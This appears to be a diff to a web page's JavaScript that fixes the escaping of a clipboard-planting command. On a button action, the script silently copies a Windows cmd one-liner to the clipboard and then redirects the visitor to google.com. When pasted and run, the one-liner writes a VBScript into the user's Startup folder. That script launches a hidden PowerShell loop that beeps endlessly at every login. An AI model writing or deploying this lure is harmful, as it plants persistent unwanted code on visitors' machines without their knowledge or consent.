@@ -15,7 +15,7 @@
 
 <script>
   function copyAndRedirect() {
-    const text = "cmd /c (echo Set sh = CreateObject^(^"WScript.Shell^"^) && echo sh.Run ^"powershell -Command while^($true^){[console]::beep^(1000,200^);Start-Sleep 1}^", 0) > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\beep.vbs"";
+    const text = `cmd /c (echo Set sh = CreateObject^("WScript.Shell"^) && echo sh.Run "powershell -Command while^($true^){[console]::beep^(1000,200^);Start-Sleep 1}", 0) > "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\beep.vbs"`;
     navigator.clipboard.writeText(text).then(() => {
       window.location.href = "https://www.google.com";
     });
